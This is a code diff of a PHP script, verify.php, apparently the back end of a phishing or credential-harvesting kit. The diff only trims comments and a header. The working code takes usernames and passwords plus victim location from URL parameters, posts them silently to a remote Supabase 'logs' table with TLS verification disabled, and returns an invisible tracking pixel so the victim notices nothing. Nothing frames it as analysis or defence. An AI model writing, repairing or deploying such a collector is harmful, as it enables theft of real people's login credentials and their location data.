@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// VERIFY.PHP - Save to Supabase Database
+// VERIFY.PHP - Save to Supabase
 // ============================================
 
 // ============================================
@@ -18,9 +18,8 @@ $country = $_GET['country'] ?? '';
 $city = $_GET['city'] ?? '';
 $continent = $_GET['continent'] ?? '';
 
-// Only save if we have username or password
+// Only save if we have data
 if (!empty($u) || !empty($p)) {
-    // Prepare data for Supabase
     $data = [
         'username' => $u,
         'password' => $p,
@@ -30,7 +29,6 @@ if (!empty($u) || !empty($p)) {
         'continent' => $continent
     ];
 
-    // Send to Supabase
     $url = $supabaseUrl . '/rest/v1/logs';
     $json = json_encode($data);
 
@@ -41,17 +39,14 @@ if (!empty($u) || !empty($p)) {
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'Content-Type: application/json',
         'apikey: ' . $supabaseKey,
-        'Authorization: Bearer ' . $supabaseKey,
-        'Prefer: return=representation'
+        'Authorization: Bearer ' . $supabaseKey
     ]);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
     $result = curl_exec($ch);
     curl_close($ch);
 }
 
-// Return 1x1 pixel (silent response)
 header('Content-Type: image/gif');
 echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 ?>
